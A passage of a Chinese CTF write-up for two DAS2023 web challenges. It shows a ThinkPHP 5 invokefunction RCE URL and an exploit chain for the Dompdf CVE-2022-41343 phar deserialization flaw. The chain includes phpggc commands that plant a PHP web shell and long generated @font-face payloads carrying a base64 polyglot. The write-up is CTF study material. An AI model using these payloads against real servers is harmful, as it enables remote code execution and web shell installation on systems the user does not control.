## Web
### pdf_converter
这道题没绷住，当时看到tp版本还在想是不是会有那个tp5的rce的cve，但还是是按照预期解去复现pdfdom的cve，做到一半出了revenge，题解还很多就感觉应该是遭了那个cve的非预期了
`/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`

![](attachments/Pasted%20image%2020230423160113.png)

### pdf_converter_revenge
这道题是明显的cve  pdfdom
一开始看了1.2+版本的的漏洞，后面发现是2.0.0
https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
重新定位到了CVE-2022-41343
参考 [DomPDF库反序列化RCE漏洞分析 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/79602.html)
这里提到的phpggc[ambionics/phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. (github.com)](https://github.com/ambionics/phpggc)
按照这篇文章操作[CVE-2022-41343 - 通过 Phar 反序列化的 RCE (buaq.net)](https://buaq.net/go-129526.html)，但是phpggc要调整为thinkphp 5.0.24

![](attachments/Pasted%20image%2020230423144504.png)

```shell
python3 generate_font.py > font.ttf

php -d phar.readonly=0 phpggc ThinkPHP/RCE2 system "echo '<?php system(\$_GET[0]); ?>' > /var/www/html/public/shell.php" -p phar -pp /mnt/c/Users/wum0nster/Desktop/buu/DAS2023_4/WEB-pdf_convert/exp/font.ttf -o font-polyglot.phar

python3 generate_payload.py -p "/var/www/html" font-polyglot.phar
```

payload
```css
====== REQUEST 1 ENCODED =======

<style>@font-face+{+font-family:'exploit';+src:url('data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDC72QAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252BTW0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5SJa18PPPUACwPoAAAAAOBqhPcAAAAA4GqE9wAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBqhPcAAAAA4GqE9zw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%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%252F2KQBAAAAAAAAdGVzdOHDteHjAHGtIYUaCLi8oBWONZvOAgAAAEdCTUI%253D');+font-weight:'normal';+font-style:'normal';}</style>

====== REQUEST 2 ENCODED =======

<style>@font-face+{+font-family:'exploit';+src:url('phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_169018fcae8494ea0bcb69c448397916.ttf%23%23');+font-weight:'normal';+font-style:'normal';}</style>

====== REQUEST 1 NOT ENCODED =======

<style>
    @font-face {
        font-family:'exploit';
        src:url('data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDC72QAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252BTW0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5SJa18PPPUACwPoAAAAAOBqhPcAAAAA4GqE9wAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBqhPcAAAAA4GqE9zw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%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%252F2KQBAAAAAAAAdGVzdOHDteHjAHGtIYUaCLi8oBWONZvOAgAAAEdCTUI%253D');
        font-weight:'normal';
        font-style:'normal';
    }
</style>

====== REQUEST 2 NOT ENCODED =======

<style>
    @font-face {
        font-family:'exploit';
        src:url('phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_169018fcae8494ea0bcb69c448397916.ttf##');
        font-weight:'normal';
        font-style:'normal';
    }
</style>


┌──(root㉿wum0nster)-[/mnt/c/Users/wum0nster/Desktop/buu/DAS2023_4/WEB-pdf_convert/exp]
└─# python3 generate_payload.py -p "/var/www/html" font-polyglot.phar
====== REQUEST 1 ENCODED =======

<style>@font-face+{+font-family:'exploit';+src:url('data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDC72QAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252BTW0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5SJa18PPPUACwPoAAAAAOBqhPcAAAAA4GqE9wAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBqhPcAAAAA4GqE9zw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%252FPg0KeQoAAAEAAAARAAAAAQAAAAAAQwoAAE86Mjc6InRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cyI6MTp7czozNDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwBmaWxlcyI7YToxOntpOjA7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjU6e3M6OToiACoAYXBwZW5kIjthOjE6e2k6MDtzOjg6ImdldEVycm9yIjt9czo4OiIAKgBlcnJvciI7TzoyNzoidGhpbmtcbW9kZWxccmVsYXRpb25cSGFzT25lIjozOntzOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo2NjoiZWNobyAnPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvc2hlbGwucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjt